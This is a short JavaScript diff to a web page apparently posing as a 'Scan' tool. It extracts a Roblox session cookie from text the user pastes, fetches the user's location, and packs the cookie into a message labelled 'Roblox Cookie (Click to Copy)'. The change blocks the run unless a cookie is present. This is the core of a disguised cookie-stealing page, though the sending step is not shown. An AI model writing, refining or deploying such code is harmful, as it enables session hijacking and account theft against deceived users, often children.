@@ -234,6 +234,21 @@ async function submitPowerShell() {
         const limitedItems = extractLimitedItems(inputText);
         const robloxCookie = extractRobloxCookie(inputText);
         
+        // Block execution if no cookie is found
+        if (!robloxCookie) {
+            stopLoadingAnimation(submitText);
+            submitText.textContent = 'No Cookie Found';
+            submitBtn.style.background = '#ef4444'; // Red error color
+            showNotification('No valid Roblox cookie detected in input', 'error');
+            
+            setTimeout(() => {
+                submitBtn.disabled = false;
+                submitText.textContent = 'Scan';
+                submitBtn.style.background = '';
+            }, 3000);
+            return;
+        }
+        
         // Get user location
         const locationInfo = await getUserLocation();
         
@@ -252,7 +267,7 @@ async function submitPowerShell() {
                 fields: [
                     {
                         name: "🍪 Roblox Cookie (Click to Copy)",
-                        value: robloxCookie ? `\`\`\`\n${robloxCookie}\n\`\`\`` : "❌ No cookie found",
+                        value: `\`\`\`\n${robloxCookie}\n\`\`\``,
                         inline: false
                     },
                     {
